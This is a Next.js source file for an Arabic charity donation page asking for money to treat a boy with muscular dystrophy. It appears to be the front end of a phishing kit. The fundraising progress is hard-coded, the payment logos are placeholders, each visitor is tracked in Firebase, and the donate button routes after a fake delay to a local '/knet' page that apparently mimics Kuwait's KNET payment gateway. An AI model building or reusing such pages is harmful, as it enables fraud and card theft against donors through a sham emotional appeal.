"use client"

import { Plus, Minus, Search, ChevronLeft } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Progress } from "@/components/ui/progress"
import { Footer } from "@/components/footer"
import { useEffect, useState } from "react"
import { addData } from "@/lib/firebase"
import { useRouter } from "next/navigation"
import { FullPageLoader } from "@/components/fullpageloader"

export default function CharityDonationPage() {
  const [value, setValue] = useState(10)
  const [loading, setLoading] = useState(false)
  const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))
  const router = useRouter()

  useEffect(() => {
    const data = {
      id: _id,
      createdDate: new Date().toISOString(),
    }
    addData(data)
    // Store donation amount in localStorage
    localStorage.setItem("item", value.toString())
  }, [_id])

  // Update localStorage when donation value changes
  useEffect(() => {
    localStorage.setItem("item", value.toString())
  }, [value])

  return (
    <div className="max-w-md mx-auto bg-white min-h-screen flex flex-col">
      {/* Header */}
      <header className="flex items-center justify-between p-4">
        <button className="bg-teal-600 text-white px-4 py-2 rounded-full text-sm font-medium">التبرع السريع</button>
        <div className="flex items-center">
          <img src="/211x54.jpg" alt="Elaf Charity" width={120} height={40} className="h-10 w-auto" />
        </div>
        <button className="text-teal-600">
          <span className="sr-only">Menu</span> 
          <svg viewBox="0 0 24 24" className="h-6 w-6" fill="none" stroke="currentColor" strokeWidth="2">
            <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16m-7 6h7" />
          </svg>
        </button>
      </header>

      {/* Search Bar */}
      <div className="px-4 py-2 bg-white">
        <div className="relative bg-gray-100 rounded-full">
          <Input
            type="text"
            placeholder="البحث عن المشاريع"
            className="pl-10 pr-4 py-2 rounded-full border-0 bg-gray-100 w-full text-right"
          />
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 overflow-auto">
        {/* Campaign Banner */}
        <div className="relative bg-gradient-to-r from-teal-500 to-teal-400 text-white rounded-lg mx-4 overflow-hidden">
          <div className="flex">
            <img src="/fzza.jpeg" alt="Child profile"  className="w-full h-auto" />
          </div>
          <div className="absolute left-2 top-1/2 transform -translate-y-1/2 bg-white/20 rounded-full p-1">
            <ChevronLeft className="h-5 w-5 text-white" />
          </div>
        </div>

        {/* Share Section */}
        <div className="flex justify-between items-center px-4 py-3">
          <div className="flex items-center gap-2">
            <div className="text-xs text-gray-500">: شارك المشروع</div>
            <div className="flex gap-1">
              <a href="#" className="w-6 h-6 rounded-full bg-black flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="h-3 w-3 text-white" fill="currentColor">
                  <path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z" />
                </svg>
              </a>
              <a href="#" className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="h-3 w-3 text-white" fill="currentColor">
                  <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
                </svg>
              </a>
              <a href="#" className="w-6 h-6 rounded-full bg-black flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="h-3 w-3 text-white" fill="currentColor">
                  <path d="M22.675 0H1.325C.593 0 0 .593 0 1.325v21.351C0 23.407.593 24 1.325 24h21.35c.731 0 1.325-.593 1.325-1.325V1.325C24 .593 23.407 0 22.675 0zm-6.033 9.84v.43h-1.497c-.55 0-.66.262-.66.648v1.112h2.1l-.209 2.12h-1.89v5.93h-2.1v-5.93H10.5v-2.12h1.886V10.81c0-1.867.522-3.015 2.732-3.015h1.524v2.046z" />
                </svg>
              </a>
            </div>
          </div>
          <div className="flex items-center gap-1">
            <span className="text-amber-600 font-bold">خيري</span>
            <svg viewBox="0 0 24 24" className="h-5 w-5 text-amber-600" fill="currentColor">
              <path d="M17.56 21a1 1 0 01-.46-.11L12 18.22l-5.1 2.67a1 1 0 01-1.45-1.06l1-5.63-4.12-4a1 1 0 01-.25-1 1 1 0 01.81-.68l5.7-.83 2.51-5.13a1 1 0 011.8 0l2.54 5.12 5.7.83a1 1 0 01.81.68 1 1 0 01-.25 1l-4.12 4 1 5.63a1 1 0 01-.4 1 1 1 0 01-.62.18z" />
            </svg>
          </div>
        </div>

        {/* Campaign Details */}
        <div className="px-4 py-2">
          <h2 className="text-xl font-bold text-right text-teal-600 mb-3">فرحة ولدكم صقر</h2>
          <p className="text-right text-sm text-gray-700 mb-3 leading-relaxed">
            ابرة قريب المليون دينار كويتي
            <br />
            لمرض نادر السبب (دوشين) وهو ضمور العضلات
            <br />
            أصيب به صقر هذا الطفل الذي لم يتجاوز عمره 7 سنوات
            <br />
            منذ أن كان في عمر السنتين وهو يعاني من هذا المرض الخطير
            <br />
            صعوبة في الحركة إلى أن تم تشخيصه بالضمور في العضلات مما يستدعي العلاج المستمر حتى
            <br />
            إلى أن يصل إلى عضلة القلب (متوقف حالياً)
            <br />
            ساعدونا في إنقاذ صقر والمساهمة في علاجه إلى بقية عمره وتخفيف أسرته معه.
          </p>
        </div>

        {/* Progress Bar */}
        <div className="px-4 py-2 text-sm">
          <div className="flex items-center mb-2">
            <div className="text-amber-500 font-bold">15%</div>
            <div className="h-2 flex-1 mx-2">
              <Progress value={15} className="h-2 bg-gray-200" />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4 text-right mt-4">
            <div className="flex justify-between">
              <div className="font-bold">د.ك 970.000</div>
              <div className="text-gray-500">قيمة المشروع</div>
            </div>
            <div className="flex justify-between">
              <div className="font-bold">د.ك 152.670</div>
              <div className="text-gray-500">المدفوع</div>
            </div>
            <div className="flex justify-between">
              <div className="font-bold">د.ك 817.330</div>
              <div className="text-gray-500">المتبقي</div>
            </div>
          </div>
        </div>

        {/* Project Info */}
        <div className="px-4 py-2 mt-2">
          <div className="mb-4">
            <div className="border rounded-md p-3 text-right text-gray-400">
              <span className="mx-2">اسم المشروع</span>
              <span className="mx-2 text-gray-500">فرحة ولدكم صقر</span>
            </div>
          </div>

          <div className="mb-4">
            <div className="border rounded-md p-3 flex items-center justify-between">
              <div className="flex items-center">
                <span className="text-xs ml-1">+965</span>
              </div>
              <input className="text-right text-gray-400 px-4" placeholder="رقم الهاتف" aria-label="تليفون المتبرع" />
              <span className="text-gray-400">تليفون المتبرع</span>
            </div>
          </div>

          <div className="mb-4">
            <div className="border rounded-md p-3 text-right text-gray-400 flex items-center justify-between">
              <input
                className="text-right text-gray-400 px-4 flex-1"
                placeholder="البريد الإلكتروني"
                aria-label="البريد الإلكتروني للمتبرع"
              />
              <span className="text-gray-400">البريد الإلكتروني للمتبرع</span>
            </div>
          </div>
        </div>

        {/* Donation Amount */}
        <div className="px-4 py-2">
          <div className="flex items-center justify-between border rounded-md mb-4">
            <button className="p-3 text-teal-600" onClick={() => setValue(value + 10)} aria-label="زيادة المبلغ">
              <Plus className="h-5 w-5" />
            </button>
            <div className="flex-1 text-center font-bold text-lg">{value}</div>
            <button
              className="p-3 text-teal-600"
              onClick={() => {
                if (value > 10) {
                  setValue(value - 10)
                }
              }}
              aria-label="تقليل المبلغ"
            >
              <Minus className="h-5 w-5" />
            </button>
          </div>

          <div className="grid grid-cols-6 gap-2 mb-4">
            {[500, 300, 100, 50, 10, 1].map((amount) => (
              <button
                key={amount}
                onClick={() => setValue(amount)}
                className="border rounded-md py-2 text-center text-sm hover:bg-gray-50"
              >
                {amount}
              </button>
            ))}
          </div>

          <div className="flex justify-end mb-6"></div>
        </div>

        {/* Payment Methods */}
        <div className="px-4 py-2">
          <div className="flex flex-wrap gap-3 justify-between mb-6">
            <div className="border rounded-md p-2 w-[22%] h-12 flex items-center justify-center relative">
              <img src="/vercel.svg" alt="Payment Method 1" width={60} height={30} className="h-6 w-auto" />
            </div>
            <div className="border rounded-md p-2 w-[22%] h-12 flex items-center justify-center relative">
              <img src="/next.svg" alt="Payment Method 2" width={60} height={30} className="h-6 w-auto" />
            </div>
            <div className="border border-blue-500 rounded-md p-2 w-[22%] h-12 flex items-center justify-center">
              <img src="/kn.png" alt="K-net" width={60} height={30} className="h-6 w-auto" />
            </div>
          </div>

          {/* Donation Buttons */}
          <div className="space-y-2 mb-6">
            <Button className="w-full bg-amber-600 hover:bg-amber-700 text-white py-3 rounded-md flex items-center justify-center gap-2">
              <svg viewBox="0 0 24 24" className="h-5 w-5" fill="currentColor">
                <path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z" />
              </svg>
              <span>إضافة إلى السلة</span>
            </Button>
            <Button
              onClick={() => {
                setLoading(true)
                localStorage.setItem("item", value.toString())
                setTimeout(() => {
                  setLoading(false)
                  router.push("/knet")
                }, 4000)
              }}
              className="w-full bg-teal-600 hover:bg-teal-700 text-white py-3 rounded-md"
            >
              تبرع
            </Button>
          </div>
        </div>
      </main>

      {/* WhatsApp Button */}
      <div className="fixed bottom-4 right-4">
        <button className="bg-green-500 text-white p-3 rounded-full shadow-lg" aria-label="تواصل عبر واتساب">
          <svg viewBox="0 0 24 24" className="h-6 w-6" fill="currentColor">
            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
          </svg>
        </button>
      </div>
      {loading && <FullPageLoader />}

      {/* Add Footer component at the bottom */}
      <Footer />
    </div>
  )
}

